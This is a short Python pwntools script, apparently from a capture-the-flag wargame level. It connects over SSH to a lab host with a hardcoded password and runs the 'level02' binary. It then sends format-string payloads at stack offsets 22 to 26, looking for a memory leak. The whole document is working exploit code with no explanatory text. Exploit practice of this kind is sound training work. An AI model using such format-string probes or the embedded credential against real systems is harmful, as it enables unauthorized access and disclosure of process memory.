from pwn import *
from sys import exit
if __name__ == "__main__":
    shell = ssh('level02', '172.16.70.130', password='PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv', port=4242)
    for x in range(22, 27):
        print("[TEST]%" +str(x) +"$x")
        sh = shell.run('./level02')
        sh.recv()
        sh.sendline("AAAA|%" +str(x) +"$lx")
        sh.recv()
        sh.sendline('fakepassword')
        sh.recvline()
        test = sh.recv()
        if "does" in test:
            print("[GOOD]", test, x)
        sh.close()
